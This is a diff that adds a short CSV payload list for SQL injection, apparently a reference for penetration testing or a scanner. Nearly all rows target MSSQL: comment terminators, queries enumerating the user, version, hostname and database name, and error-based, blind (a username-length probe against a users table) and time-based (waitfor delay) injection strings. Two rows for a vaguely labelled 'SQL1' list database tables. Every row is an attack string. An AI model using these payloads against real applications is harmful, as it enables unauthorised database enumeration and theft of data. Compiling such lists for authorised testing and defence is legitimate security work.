@@ -1,0 +1,12 @@
+Category,Type,Description,Payload
+MSSQL,Comment,C-style comment,/* MSSQL Comment */
+MSSQL,Comment,SQL comment,-- -
+MSSQL,User,Fetch current user,SELECT CURRENT_USER
+MSSQL,Version,Fetch MSSQL version,SELECT @@version
+MSSQL,Hostname,Fetch MSSQL hostname,SELECT HOST_NAME()
+MSSQL,DB Name,Fetch current database name,SELECT DB_NAME()
+MSSQL,Error Based,SQL Error-based Injection,convert(int,@@version)
+MSSQL,Blind Based,SQL Blind Injection,AND LEN(SELECT TOP 1 username FROM tblusers)=5 ; -- -
+MSSQL,Time Based,SQL Time-based Injection,waitfor delay '0:0:10'
+SQL1,Version,Fetch version for SQL1,SELECT version()
+SQL1,List Tables,List tables for SQL1,SELECT table_name FROM information_schema.tables
